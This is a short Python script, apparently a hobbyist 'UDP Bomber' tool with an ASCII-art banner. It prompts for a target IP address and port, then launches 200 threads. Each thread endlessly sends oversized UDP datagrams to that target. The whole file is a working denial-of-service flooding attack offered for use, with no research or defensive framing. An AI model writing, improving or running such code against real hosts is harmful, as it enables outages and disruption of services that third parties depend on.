import socket
import random
import threading


print("""

███████╗██╗░░██╗██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
╚════██║╚██╗██╔╝██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
░░███╔═╝░╚███╔╝░██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
██╔══╝░░░██╔██╗░██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
███████╗██╔╝╚██╗██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚══════╝╚═╝░░╚═╝╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
UDP Bomber Tools
""")
ip = str(input("IP : "))
port = int(input("Port : "))

def attack():
    data = bytearray(1000000)
    data[0] = 0x1B
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 100000)
    addr = (str(ip),int(port))
    while True:
        s.sendto(data, addr)

for _ in range(200):
    t = threading.Thread(target=attack)
    t.start()